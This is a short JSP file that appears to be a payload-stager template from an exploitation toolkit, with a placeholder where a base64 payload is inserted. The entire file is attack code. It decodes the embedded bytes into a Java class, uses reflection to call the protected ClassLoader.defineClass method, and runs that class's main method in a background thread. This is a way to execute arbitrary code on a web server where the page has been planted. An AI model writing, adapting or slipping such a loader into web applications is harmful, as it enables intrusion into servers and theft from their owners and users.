<%
try {
String BASE64 = "${[BASE64PAYLOAD|"+
  "|]}";
byte[] DATA = new sun.misc.BASE64Decoder().decodeBuffer(BASE64);
ClassLoader ldr = new java.net.URLClassLoader(new java.net.URL[0]);
java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", new Class[] {byte[].class, int.class, int.class});
m.setAccessible(true);
final Class c = (Class)m.invoke(ldr, new Object[] {DATA, 0, DATA.length});
Runnable r = new Runnable() {
	public void run() {
		try {
		c.getMethod("main", new Class[] {String[].class}).invoke(null, new Object[] {new String[0]});
		} catch (Exception ex) {
		throw new RuntimeException(ex);
		}
	}
};
new Thread(r).start();
} catch (Exception ex) {
throw new RuntimeException(ex);
}
%>